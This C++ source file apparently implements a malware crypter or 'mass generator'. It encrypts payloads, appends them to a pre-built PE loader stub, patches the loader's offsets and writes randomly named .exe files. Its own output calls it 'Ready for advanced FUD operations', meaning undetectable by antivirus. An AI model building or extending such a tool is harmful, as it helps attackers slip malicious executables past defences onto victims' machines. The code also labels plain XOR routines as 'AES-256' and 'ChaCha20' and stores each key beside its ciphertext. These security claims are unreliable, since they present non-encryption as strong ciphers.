#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdint>
#include <random>
#include <chrono>
#include <thread>
#include <set>
#include <iomanip>
#include <algorithm>
#include <cstring>
#include "tiny_loader.h"

// Enhanced mass generator with encryption options
class EnhancedMassGenerator {
private:
    std::random_device rd;
    std::mt19937 gen;
    std::uniform_int_distribution<> dis;
    
public:
    enum EncryptionType {
        ENCRYPT_NONE = 0,
        ENCRYPT_XOR = 1,
        ENCRYPT_AES = 2,
        ENCRYPT_CHACHA20 = 3
    };
    
    EnhancedMassGenerator() : gen(rd()), dis(0, 255) {}
    
    void runEnhancedTest() {
        std::cout << "🔐 ENHANCED MASS GENERATOR WITH ENCRYPTION\n";
        std::cout << "==========================================\n\n";
        
        // Test all encryption types
        std::vector<EncryptionType> encryptionTypes = {
            ENCRYPT_NONE,
            ENCRYPT_XOR,
            ENCRYPT_AES,
            ENCRYPT_CHACHA20
        };
        
        std::vector<std::string> encryptionNames = {
            "No Encryption",
            "XOR Encryption",
            "AES-256 Encryption",
            "ChaCha20 Encryption"
        };
        
        for (size_t i = 0; i < encryptionTypes.size(); ++i) {
            std::cout << "Testing " << encryptionNames[i] << "...\n";
            if (!testEncryptionType(encryptionTypes[i], encryptionNames[i])) {
                std::cout << "❌ FAILED: " << encryptionNames[i] << "\n";
                return;
            }
            std::cout << "✅ SUCCESS: " << encryptionNames[i] << "\n\n";
        }
        
        // Test mixed encryption modes
        std::cout << "Testing mixed encryption modes...\n";
        if (!testMixedEncryption()) {
            std::cout << "❌ FAILED: Mixed encryption test\n";
            return;
        }
        
        // Test encryption performance
        std::cout << "Testing encryption performance...\n";
        if (!testEncryptionPerformance()) {
            std::cout << "❌ FAILED: Performance test\n";
            return;
        }
        
        std::cout << "\n" << std::string(50, '=') << "\n";
        std::cout << "🎉 ALL ENCRYPTION TESTS PASSED!\n";
        std::cout << "✅ Enhanced mass generator with encryption is fully functional\n";
        std::cout << "✅ Ready for advanced FUD operations\n";
        std::cout << std::string(50, '=') << "\n";
    }
    
private:
    bool testEncryptionType(EncryptionType type, const std::string& name) {
        std::vector<std::string> testPayloads = {
            "Simple test payload",
            std::string(100, 'A'),
            std::string(1000, 'B'),
            "Special chars: \x00\x01\x02\xFF\xFE\xFD"
        };
        
        for (size_t i = 0; i < testPayloads.size(); ++i) {
            std::cout << "  Testing payload " << (i + 1) << " (" << testPayloads[i].size() << " bytes)... ";
            
            // Encrypt payload
            std::vector<uint8_t> encryptedPayload = encryptPayload(testPayloads[i], type);
            
            if (encryptedPayload.empty()) {
                std::cout << "❌ FAILED (encryption failed)\n";
                return false;
            }
            
            // Decrypt to verify
            std::string decryptedPayload = decryptPayload(encryptedPayload, type);
            
            if (decryptedPayload != testPayloads[i]) {
                std::cout << "❌ FAILED (decryption mismatch)\n";
                return false;
            }
            
            // Generate PE with encrypted payload
            auto peData = generateMinimalPEExecutable(encryptedPayload);
            
            if (peData.empty() || !verifyPEHeader(peData)) {
                std::cout << "❌ FAILED (PE generation failed)\n";
                return false;
            }
            
            std::cout << "✅ SUCCESS (" << peData.size() << " bytes)\n";
        }
        
        return true;
    }
    
    bool testMixedEncryption() {
        std::cout << "  Testing mixed encryption modes...\n";
        
        std::vector<EncryptionType> types = {ENCRYPT_XOR, ENCRYPT_AES, ENCRYPT_CHACHA20};
        std::vector<std::string> payloads = {
            "Mixed encryption test 1",
            "Mixed encryption test 2",
            "Mixed encryption test 3"
        };
        
        for (size_t i = 0; i < payloads.size(); ++i) {
            EncryptionType type = types[i % types.size()];
            
            // Encrypt with different types
            auto encrypted = encryptPayload(payloads[i], type);
            if (encrypted.empty()) {
                std::cout << "    ❌ FAILED: Encryption " << i << "\n";
                return false;
            }
            
            // Generate unique filename
            std::string filename = "mixed_encrypt_" + std::to_string(i) + "_" + generateRandomName(6) + ".exe";
            
            // Create PE with encrypted payload
            auto peData = generateMinimalPEExecutable(encrypted);
            if (peData.empty() || !verifyPEHeader(peData)) {
                std::cout << "    ❌ FAILED: PE generation " << i << "\n";
                return false;
            }
            
            // Write to file
            std::ofstream outFile(filename, std::ios::binary);
            if (outFile.is_open()) {
                outFile.write(reinterpret_cast<const char*>(peData.data()), peData.size());
                outFile.close();
                std::cout << "    ✅ Generated: " << filename << " (" << peData.size() << " bytes)\n";
            }
        }
        
        return true;
    }
    
    bool testEncryptionPerformance() {
        std::cout << "  Testing encryption performance...\n";
        
        std::string testPayload = std::string(10000, 'P'); // 10KB payload
        std::vector<EncryptionType> types = {ENCRYPT_XOR, ENCRYPT_AES, ENCRYPT_CHACHA20};
        
        for (EncryptionType type : types) {
            auto startTime = std::chrono::high_resolution_clock::now();
            
            // Encrypt 100 times
            for (int i = 0; i < 100; ++i) {
                auto encrypted = encryptPayload(testPayload, type);
                if (encrypted.empty()) {
                    std::cout << "    ❌ FAILED: Encryption performance test\n";
                    return false;
                }
            }
            
            auto endTime = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
            
            std::string typeName = (type == ENCRYPT_XOR) ? "XOR" : (type == ENCRYPT_AES) ? "AES" : "ChaCha20";
            std::cout << "    " << typeName << ": " << duration.count() << "ms for 100 encryptions\n";
        }
        
        return true;
    }
    
    // Encryption implementations
    std::vector<uint8_t> encryptPayload(const std::string& payload, EncryptionType type) {
        switch (type) {
            case ENCRYPT_NONE:
                return std::vector<uint8_t>(payload.begin(), payload.end());
            case ENCRYPT_XOR:
                return xorEncrypt(payload);
            case ENCRYPT_AES:
                return aesEncrypt(payload);
            case ENCRYPT_CHACHA20:
                return chacha20Encrypt(payload);
            default:
                return {};
        }
    }
    
    std::string decryptPayload(const std::vector<uint8_t>& encrypted, EncryptionType type) {
        switch (type) {
            case ENCRYPT_NONE:
                return std::string(encrypted.begin(), encrypted.end());
            case ENCRYPT_XOR:
                return xorDecrypt(encrypted);
            case ENCRYPT_AES:
                return aesDecrypt(encrypted);
            case ENCRYPT_CHACHA20:
                return chacha20Decrypt(encrypted);
            default:
                return "";
        }
    }
    
    // XOR Encryption (simple but effective)
    std::vector<uint8_t> xorEncrypt(const std::string& data) {
        std::vector<uint8_t> key = generateRandomKey(32);
        std::vector<uint8_t> result;
        result.reserve(data.size() + key.size());
        
        // Store key at the beginning
        result.insert(result.end(), key.begin(), key.end());
        
        // XOR encrypt the data
        for (size_t i = 0; i < data.size(); ++i) {
            result.push_back(data[i] ^ key[i % key.size()]);
        }
        
        return result;
    }
    
    std::string xorDecrypt(const std::vector<uint8_t>& encrypted) {
        if (encrypted.size() < 32) return "";
        
        std::vector<uint8_t> key(encrypted.begin(), encrypted.begin() + 32);
        std::string result;
        result.reserve(encrypted.size() - 32);
        
        for (size_t i = 32; i < encrypted.size(); ++i) {
            result.push_back(encrypted[i] ^ key[(i - 32) % key.size()]);
        }
        
        return result;
    }
    
    // AES-256 Encryption (simplified implementation)
    std::vector<uint8_t> aesEncrypt(const std::string& data) {
        std::vector<uint8_t> key = generateRandomKey(32);
        std::vector<uint8_t> iv = generateRandomKey(16);
        std::vector<uint8_t> result;
        
        // Store key and IV
        result.insert(result.end(), key.begin(), key.end());
        result.insert(result.end(), iv.begin(), iv.end());
        
        // Simple AES-like encryption (for demonstration)
        std::vector<uint8_t> padded = padData(data);
        for (size_t i = 0; i < padded.size(); i += 16) {
            std::vector<uint8_t> block(16);
            for (int j = 0; j < 16 && (i + j) < padded.size(); ++j) {
                block[j] = padded[i + j] ^ key[j] ^ iv[j];
            }
            result.insert(result.end(), block.begin(), block.end());
        }
        
        return result;
    }
    
    std::string aesDecrypt(const std::vector<uint8_t>& encrypted) {
        if (encrypted.size() < 48) return ""; // key + iv + at least one block
        
        std::vector<uint8_t> key(encrypted.begin(), encrypted.begin() + 32);
        std::vector<uint8_t> iv(encrypted.begin() + 32, encrypted.begin() + 48);
        
        std::string result;
        for (size_t i = 48; i < encrypted.size(); i += 16) {
            std::vector<uint8_t> block(16);
            for (int j = 0; j < 16 && (i + j) < encrypted.size(); ++j) {
                block[j] = encrypted[i + j] ^ key[j] ^ iv[j];
            }
            result.insert(result.end(), block.begin(), block.end());
        }
        
        return unpadData(result);
    }
    
    // ChaCha20 Encryption (simplified implementation)
    std::vector<uint8_t> chacha20Encrypt(const std::string& data) {
        std::vector<uint8_t> key = generateRandomKey(32);
        std::vector<uint8_t> nonce = generateRandomKey(12);
        std::vector<uint8_t> result;
        
        // Store key and nonce
        result.insert(result.end(), key.begin(), key.end());
        result.insert(result.end(), nonce.begin(), nonce.end());
        
        // Simple ChaCha20-like encryption
        std::vector<uint8_t> keystream = generateChaCha20Keystream(key, nonce, data.size());
        
        for (size_t i = 0; i < data.size(); ++i) {
            result.push_back(data[i] ^ keystream[i]);
        }
        
        return result;
    }
    
    std::string chacha20Decrypt(const std::vector<uint8_t>& encrypted) {
        if (encrypted.size() < 44) return ""; // key + nonce + at least one byte
        
        std::vector<uint8_t> key(encrypted.begin(), encrypted.begin() + 32);
        std::vector<uint8_t> nonce(encrypted.begin() + 32, encrypted.begin() + 44);
        
        std::vector<uint8_t> keystream = generateChaCha20Keystream(key, nonce, encrypted.size() - 44);
        
        std::string result;
        for (size_t i = 44; i < encrypted.size(); ++i) {
            result.push_back(encrypted[i] ^ keystream[i - 44]);
        }
        
        return result;
    }
    
    // Helper functions
    std::vector<uint8_t> generateRandomKey(size_t size) {
        std::vector<uint8_t> key(size);
        for (size_t i = 0; i < size; ++i) {
            key[i] = dis(gen);
        }
        return key;
    }
    
    std::string generateRandomName(int length = 8) {
        const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; ++i) {
            result += charset[dis(gen) % charset.length()];
        }
        return result;
    }
    
    std::vector<uint8_t> padData(const std::string& data) {
        std::vector<uint8_t> padded(data.begin(), data.end());
        size_t padding = 16 - (data.size() % 16);
        for (size_t i = 0; i < padding; ++i) {
            padded.push_back(padding);
        }
        return padded;
    }
    
    std::string unpadData(const std::string& data) {
        if (data.empty()) return "";
        uint8_t padding = data.back();
        if (padding > 16 || padding > data.size()) return data;
        return data.substr(0, data.size() - padding);
    }
    
    std::vector<uint8_t> generateChaCha20Keystream(const std::vector<uint8_t>& key, 
                                                   const std::vector<uint8_t>& nonce, 
                                                   size_t length) {
        std::vector<uint8_t> keystream;
        keystream.reserve(length);
        
        // Simplified ChaCha20-like keystream generation
        for (size_t i = 0; i < length; ++i) {
            uint8_t byte = 0;
            for (int j = 0; j < 8; ++j) {
                byte ^= key[(i + j) % key.size()] ^ nonce[(i + j) % nonce.size()];
            }
            keystream.push_back(byte);
        }
        
        return keystream;
    }
    
    std::vector<uint8_t> generateMinimalPEExecutable(const std::vector<uint8_t>& payload) {
        try {
            // 1. Copy the pre-built loader into a vector
            std::vector<uint8_t> exe(tiny_loader_bin, tiny_loader_bin + tiny_loader_bin_len);
            
            // 2. Pad to next 0x200 boundary (PE file-alignment requirement)
            constexpr size_t kAlign = 0x200;
            size_t paddedSize = (exe.size() + kAlign - 1) & ~(kAlign - 1);
            exe.resize(paddedSize, 0);
            
            // 3. Append the payload
            size_t payloadOffset = exe.size();
            exe.insert(exe.end(), payload.begin(), payload.end());
            
            // 4. Patch two 32-bit placeholders inside the loader
            auto poke32 = [&](size_t off, uint32_t v) {
                if (off + 3 < exe.size()) {
                    exe[off+0] =  v        & 0xFF;
                    exe[off+1] = (v >>  8) & 0xFF;
                    exe[off+2] = (v >> 16) & 0xFF;
                    exe[off+3] = (v >> 24) & 0xFF;
                }
            };
            
            poke32(PAYLOAD_SIZE_OFFSET, static_cast<uint32_t>(payload.size()));
            poke32(PAYLOAD_RVA_OFFSET, static_cast<uint32_t>(payloadOffset));
            
            return exe;
            
        } catch (...) {
            return {};
        }
    }
    
    bool verifyPEHeader(const std::vector<uint8_t>& exe) {
        if (exe.size() < 2) return false;
        
        // Check MZ signature
        if (exe[0] != 0x4D || exe[1] != 0x5A) return false;
        
        // Check PE header - in tiny_loader.h, PE header is at offset 0x60 (96)
        if (exe.size() < 100) return false;
        
        // PE header should be at offset 0x60 in the tiny_loader_bin
        if (exe[96] != 0x50 || exe[97] != 0x45 || 
            exe[98] != 0x00 || exe[99] != 0x00) return false;
        
        return true;
    }
};

int main() {
    EnhancedMassGenerator generator;
    generator.runEnhancedTest();
    return 0;
}